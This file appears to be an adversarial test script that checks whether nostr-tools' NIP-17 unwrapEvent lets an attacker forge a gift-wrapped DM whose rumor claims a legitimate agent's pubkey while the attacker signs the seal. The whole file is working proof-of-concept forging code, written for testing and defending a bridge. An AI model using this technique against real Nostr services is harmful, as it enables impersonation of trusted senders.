// Test adversarial M-NEW: gift-wrap with rumor.pubkey != seal.pubkey
// nostr-tools 2.24.1: unwrapEvent decrypts the seal with the conversation key
// derived from seal.pubkey and returns the rumor with its internal pubkey WITHOUT comparing it
// against whoever signed the seal. We verify whether the bridge would accept an impersonated DM.
const {generateSecretKey, getPublicKey, finalizeEvent} = require('nostr-tools');
const nip44 = require('nostr-tools/nip44');
const {unwrapEvent} = require('nostr-tools/nip17');

console.log('nostr-tools 2.24.1 — test adversarial rumor.pubkey != seal.pubkey\n');

// Keys
const bridgePriv = generateSecretKey();
const bridgePub = getPublicKey(bridgePriv);
const legitAgentPriv = generateSecretKey();
const legitAgentPub = getPublicKey(legitAgentPriv);
const attackerPriv = generateSecretKey();
const attackerPub = getPublicKey(attackerPriv);

console.log('bridgePub      :', bridgePub.slice(0, 12) + '...');
console.log('legit agent:', legitAgentPub.slice(0, 12) + '... (rumor will declare this one)');
console.log('attacker       :', attackerPub.slice(0, 12) + '... (signs the seal/wrap)\n');

// 1) Rumor: kind 14, pubkey DECLARES being the legit agent
const rumor = {
  kind: 14,
  created_at: Math.floor(Date.now() / 1000),
  content: 'status',
  tags: [['p', bridgePub]],
  pubkey: legitAgentPub,
};
rumor.id = require('nostr-tools').getEventHash(rumor);

// 2) Seal: signed by the ATTACKER (NOT the owner of rumor.pubkey). Encrypted for the bridge
const attackerConvKey = nip44.getConversationKey(attackerPriv, bridgePub);
const seal = finalizeEvent({
  kind: 13,
  content: nip44.encrypt(JSON.stringify(rumor), attackerConvKey),
  created_at: Math.floor(Date.now() / 1000),
  tags: [],
}, attackerPriv);

// 3) Wrap: signed by the ATTACKER, encrypted for the bridge
const wrap = finalizeEvent({
  kind: 1059,
  content: nip44.encrypt(JSON.stringify(seal), attackerConvKey),
  created_at: Math.floor(Date.now() / 1000),
  tags: [['p', bridgePub]],
}, attackerPriv);

console.log('seal.pubkey (firmante real del seal):', seal.pubkey.slice(0, 12) + '...');
console.log('wrap.pubkey (firmante del wrap)     :', wrap.pubkey.slice(0, 12) + '...');

// 4) The bridge decrypts with bridgePriv (what handleIncomingGiftWrap does)
let unwrapped;
try {
  unwrapped = unwrapEvent(wrap, bridgePriv);
  console.log('\n[unwrapEvent] decrypted the malicious wrap (did not throw)');
  console.log('  rumor.pubkey :', unwrapped.pubkey.slice(0, 12) + '...');
  console.log('  content      :', JSON.stringify(unwrapped.content));
  const mismatch = unwrapped.pubkey !== seal.pubkey;
  console.log('\n  rumor.pubkey == seal.pubkey ?', mismatch ? 'NO (MISMATCH)' : 'SI');
  if (mismatch && unwrapped.pubkey === legitAgentPub) {
    console.log('  >>> IMPOSTURE DEMONSTRATED: the rumor declares the legit agent,');
    console.log('      the seal was signed by the attacker, and unwrapEvent accepts it.');
    console.log('      The bridge would do agentByPubkey(rumor.pubkey) -> it would accept it');
    console.log('      as a DM from the legit agent even though the attacker sent it.');
  } else if (mismatch) {
    console.log('  >>> Mismatch but does NOT impersonate a known agent.');
  } else {
    console.log('  >>> No mismatch. (?)');
  }
} catch (e) {
  console.log('\n[unwrapEvent] FAILED:', e.message);
  console.log('>>> The attack is NOT trivial: unwrapEvent/verify rejected the malicious wrap.');
}
